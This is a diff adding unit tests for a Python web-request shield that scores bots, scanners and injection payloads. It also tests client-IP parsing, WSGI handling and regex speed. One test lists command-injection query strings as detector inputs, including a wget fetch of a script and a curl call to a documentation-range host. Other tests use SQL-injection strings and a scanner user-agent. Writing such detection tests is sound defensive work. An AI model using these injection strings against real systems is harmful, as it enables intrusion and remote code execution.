@@ -6,11 +6,15 @@ import logging
 import os
 import random
 import tempfile
+import threading
+import time
 import unittest
 from datetime import datetime, timedelta, timezone
+from unittest import mock
 
 from artex_shield import (Config, Engagement, Shield, ShieldASGI, ShieldWSGI,
                           html_trap, js_trap, make_canaries, robots_txt_block)
+from artex_shield import core, signatures
 
 CHROME = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/131.0.0.0 Safari/537.36")
@@ -55,6 +59,40 @@ class Signatures(unittest.TestCase):
             c.t += random.uniform(3, 40)
             d = s.check("198.51.100.7", "GET", "/api/items", headers={"User-Agent": "python-requests/2.32"})
             self.assertEqual(d.action, "pass")
+
+    def test_soft_signals_never_throttle_however_long_they_run(self):
+        # An HTTP library polling on the second raises two soft signals (library
+        # User-Agent, even cadence). Each repeats once per half-life, so the sum
+        # must be watched over several half-lives, not one.
+        s, c = shield()
+        for _ in range(2 * 3600):
+            c.t += 1.0
+            d = s.check("198.51.100.8", "GET", "/api/items", headers={"User-Agent": "python-requests/2.32"})
+            self.assertEqual(d.action, "pass", f"after {c.t - T0:.0f} s: {d.hits}")
+            s.observe("198.51.100.8", "/api/items", 200)
+        self.assertLess(s._tracks["198.51.100.8"].score, s.cfg.throttle_score)
+
+    def test_soft_signals_on_one_request_do_not_throttle(self):
+        s, _ = shield()                           # headless browser that sends no Accept-Language
+        headless = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/")}
+        d = s.check("198.51.100.9", "GET", "/", headers=headless)
+        self.assertEqual(sorted(d.hits), ["shape:browser-ua-without-browser-headers", "ua:headless-browser"])
+        self.assertEqual(d.action, "pass")
+        self.assertLess(d.score, s.cfg.throttle_score)
+
+    def test_soft_signals_still_add_to_hard_evidence(self):
+        s, c = shield()
+        headless = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/")}
+        self.assertEqual(s.check("203.0.113.16", "GET", "/swagger.json", headers=headless).action, "pass")
+        s.observe("203.0.113.16", "/swagger.json", 404)           # recon probe: hard evidence
+        c.t += 1
+        self.assertEqual(s.check("203.0.113.16", "GET", "/", headers=headless).action, "throttle")
+
+    def test_soft_cap_must_stay_below_throttle_score(self):
+        self.assertLess(Config().soft_cap, Config().throttle_score)
+        self.assertLess(Config(throttle_score=20, block_score=40).soft_cap, 20)
+        with self.assertRaises(ValueError):
+            Config(soft_cap=50)
 
 
 class Humans(unittest.TestCase):
@@ -136,6 +174,24 @@ class Behaviour(unittest.TestCase):
         s, _ = shield()
         for q in ["q=select+a+union+rep", "q=sleep+tips", "q=o'reilly+books", "next=/account/settings"]:
             self.assertEqual(s.check("192.0.2.60", "GET", "/search", q, BROWSER).hits, [], q)
+
+    def test_ordinary_query_strings_are_not_payloads(self):
+        # `&`, `|` and `;` hold query strings and lists together; a parameter or
+        # list item called id, cat, sh, nc, uname or curl is not a shell command.
+        s, _ = shield()
+        for path, q in [("/products", "page=2&id=5"), ("/blog", "p=1&cat=3"), ("/search", "tags=dog|cat"),
+                        ("/api/items", "fields=name|id|price"), ("/api/items", "cols=uname;id;sh"),
+                        ("/list", "a=1&sh=2&nc=3&uname=bob&curl=4&wget=5&bash=6"),
+                        ("/list", "color=red;id=5;cat=3"), ("/login", "next=%2Fitems%3Fpage%3D2%26id%3D5"),
+                        ("/items;id=5", "page=2"), ("/search", "q=R%26D+jobs&id=3"), ("/go", "a=1&&id=5")]:
+            self.assertEqual(s.check("192.0.2.61", "GET", path, q, BROWSER).hits, [], f"{path}?{q}")
+
+    def test_command_injection_is_still_scored(self):
+        for q in ["host=127.0.0.1%3Bcat%20%2Ftmp%2Fkey", "host=x%7Cwhoami", "host=x%26%26id", "host=x%7C%7Cid",
+                  "host=%60id%60", "host=%24(id)", "host=x%3Bwget%20http%3A%2F%2F198.51.100.1%2Fa.sh",
+                  "host=x%7Csh%20-c%20ls", "host=x;uname -a", "host=x%253Bcurl%2520198.51.100.1"]:
+            s, _ = shield()
+            self.assertIn("payload:cmdi", s.check("203.0.113.17", "GET", "/ping", q, BROWSER).hits, q)
 
     def test_metronomic_cadence_is_flagged_but_soft(self):
         s, c = shield()
@@ -244,6 +300,43 @@ class Plumbing(unittest.TestCase):
         self.assertEqual(s.client_ip("203.0.113.99", "8.8.8.8"), "203.0.113.99")           # direct peer: ignore header
         self.assertEqual(s.client_ip("10.0.0.2", "garbage"), "10.0.0.2")
 
+    def test_forwarded_for_hop_with_a_port(self):
+        s, _ = shield(trusted_proxies=["10.0.0.0/8"])     # some load balancers append the source port
+        self.assertEqual(s.client_ip("10.0.0.2", "203.0.113.7:44321"), "203.0.113.7")
+        self.assertEqual(s.client_ip("10.0.0.2", "[2001:db8::7]:443"), "2001:db8::7")
+        self.assertEqual(s.client_ip("10.0.0.2", "[2001:db8::7]"), "2001:db8::7")
+        self.assertEqual(s.client_ip("10.0.0.2", "1.1.1.1, 203.0.113.7:44321, 10.0.0.9:80"), "203.0.113.7")
+
+    def test_unidentified_client_is_not_scored(self):
+        # When the only address available is the proxy's own, or none at all,
+        # every visitor would share one track and one scanner would block them all.
+        events = []
+        s, c = shield(trusted_proxies=["10.0.0.0/8"], on_event=events.append)
+        scanner = {"User-Agent": "sqlmap/1.9"}
+        for ip in [s.client_ip("10.0.0.2", "unknown"),     # proxy passed on a hop it could not name
+                   s.client_ip("10.0.0.2", None),          # proxy sent no header
+                   s.client_ip("", "203.0.113.7"),         # unix socket: no peer address
+                   "not-an-address"]:
+            d = s.check(ip, "GET", "/.env", "id=1' UNION SELECT 1", scanner)
+            self.assertEqual((d.action, d.score), ("pass", 0.0), ip)
+            self.assertEqual(s.check(ip, "GET", "/", headers=BROWSER).action, "pass", ip)
+        self.assertEqual(s.blocklist(), {})
+        self.assertEqual(s._tracks, {})
+        self.assertEqual(s.stats["unidentified"], 8)
+        self.assertEqual([e["action"] for e in events], ["unidentified"])       # one warning, not one per request
+        c.t += s.cfg.half_life
+        s.check("10.0.0.2", "GET", "/", headers=BROWSER)
+        self.assertEqual(len(events), 2)
+        # Clients the proxy does name are still scored.
+        self.assertEqual(s.check(s.client_ip("10.0.0.2", "203.0.113.7"), "GET", "/", headers=scanner).action, "block")
+
+    def test_unix_socket_peer_can_be_trusted(self):
+        s, _ = shield(trusted_proxies=["0.0.0.0/32"])     # the address an absent peer is given
+        self.assertEqual(s.client_ip("", "203.0.113.7"), "203.0.113.7")
+        self.assertEqual(s.check(s.client_ip("", "203.0.113.7"), "GET", "/", headers={"User-Agent": "sqlmap/1"}).action,
+                         "block")
+        self.assertEqual(s.check(s.client_ip("", "198.51.100.9"), "GET", "/", headers=BROWSER).action, "pass")
+
     def test_ipv6_tracked_per_64(self):
         s, _ = shield()
         s.check("2001:db8:1:2::1", "GET", "/", headers={"User-Agent": "sqlmap/1"})
@@ -312,6 +405,25 @@ class Adapters(unittest.TestCase):
         self.assertEqual(status, "403 Forbidden")
         self.assertIn(b"Reference:", body)
 
+    def test_wsgi_without_a_peer_address_blocks_nobody(self):
+        def app(environ, start_response):
+            start_response("200 OK", [("Content-Type", "text/plain")])
+            return [b"hi"]
+
+        s, _ = shield()
+        wrapped = ShieldWSGI(app, s)
+
+        def call(ua):                              # served over a unix socket: REMOTE_ADDR is empty
+            env = {"REQUEST_METHOD": "GET", "PATH_INFO": "/", "QUERY_STRING": "", "REMOTE_ADDR": "",
+                   "HTTP_USER_AGENT": ua, "HTTP_ACCEPT_LANGUAGE": "en", "HTTP_X_FORWARDED_FOR": "203.0.113.7",
+                   "wsgi.input": io.BytesIO()}
+            out = {}
+            b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st)))
+            return out["status"]
+
+        self.assertEqual(call("sqlmap/1.9"), "200 OK")
+        self.assertEqual(call(CHROME), "200 OK")           # the next visitor is not paying for the scanner
+
     def test_asgi(self):
         async def app(scope, receive, send):
             await send({"type": "http.response.start", "status": 200, "headers": []})
@@ -334,6 +446,78 @@ class Adapters(unittest.TestCase):
 
         self.assertEqual(asyncio.run(call(CHROME)), 200)
         self.assertEqual(asyncio.run(call("Mozilla/5.0 (spa-api-recon spider)")), 403)
+
+
+class Cost(unittest.TestCase):
+    """The shield reads attacker-controlled text on every request, so no input
+    may make that slow. Budgets are several times what a linear scan needs."""
+    BUDGET = 0.25
+
+    def timed(self, fn):
+        best = None
+        for _ in range(2):                        # best of two: ignore a scheduling hiccup
+            t0 = time.perf_counter()
+            fn()
+            took = time.perf_counter() - t0
+            best = took if best is None else min(best, took)
+            if best < self.BUDGET:
+                break
+        return best
+
+    def test_every_pattern_scans_in_linear_time(self):
+        patterns = [("HARD_UA " + label, rx) for rx, _, label in signatures.HARD_UA]
+        patterns += [("SOFT_UA " + label, rx) for rx, _, label in signatures.SOFT_UA]
+        patterns += [(label, rx) for rx, label in signatures.PAYLOADS + signatures.OOB]
+        patterns += [(name, getattr(signatures, name)) for name in
+                     ("ASSESSMENT_UA", "BROWSER_UA", "CRAWLER_UA", "SENSITIVE_PATHS", "RECON_PATHS")]
+        # Repeated fragments each pattern almost matches: the shape that makes a
+        # backtracking engine retry from every position.
+        atoms = ["a", "db", "a-", "a.", "/", " ", "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
+                 "' ", "' or ", "sleep ( ", "; ", "| cat ", "{{1 ", "${ ", "<%= 1", "on", "onload ", "<svg",
+                 "backup.", "/wp-config.php.a", "/swagger/", "/admin/", "x.oast", "-.", "curl/"]
+        slow = []
+        for name, rx in patterns:
+            for atom in atoms:
+                text = atom * (30000 // len(atom))
+                for subject in (text, "/" + text + "!"):
+                    took = self.timed(lambda: (rx.search(subject), rx.match(subject)))
+                    if took >= self.BUDGET:
+                        slow.append(f"{name} on {atom!r} x {len(subject) // len(atom)}: {took:.2f} s")
+        self.assertEqual(slow, [])
+
+    def test_oversized_requests_are_checked_quickly(self):
+        s, _ = shield()
+        padded = dict(BROWSER, **{f"X-Pad-{i}": "a" * 8000 for i in range(60)})
+        cases = {"60 padded headers": lambda: s.check("192.0.2.90", "GET", "/", "", padded),
+                 "8000-character path": lambda: s.check("192.0.2.91", "GET", "/" + "db" * 4000 + "!", "", BROWSER),
+                 "60000-character query": lambda: s.check("192.0.2.92", "GET", "/", "a" * 60000, BROWSER),
+                 "20000 query parameters": lambda: s.check("192.0.2.93", "GET", "/", "a=b&" * 20000, BROWSER),
+                 "8000-character user agent": lambda: s.check(
+                     "192.0.2.94", "GET", "/", "", {"User-Agent": "Mozilla/5.0 " * 660})}
+        for name, fn in cases.items():
+            self.assertLess(self.timed(fn), self.BUDGET, name)
+
+    def test_request_scanning_does_not_hold_the_lock(self):
+        # Decoding and pattern matching depend only on the request. Doing them
+        # under the lock would make every other request wait behind a slow one.
+        s, _ = shield()
+        free, real = [], core._decode
+
+        def decode_and_probe(text):
+            def probe():
+                got = s._lock.acquire(blocking=False)
+                if got:
+                    s._lock.release()
+                free.append(got)
+            other = threading.Thread(target=probe)
+            other.start()
+            other.join()
+            return real(text)
+
+        with mock.patch.object(core, "_decode", decode_and_probe):
+            d = s.check("203.0.113.18", "GET", "/search", "q=1%27%20UNION%20SELECT%201", BROWSER)
+        self.assertIn("payload:sqli", d.hits)
+        self.assertTrue(free and all(free), free)
 
 
 if __name__ == "__main__":
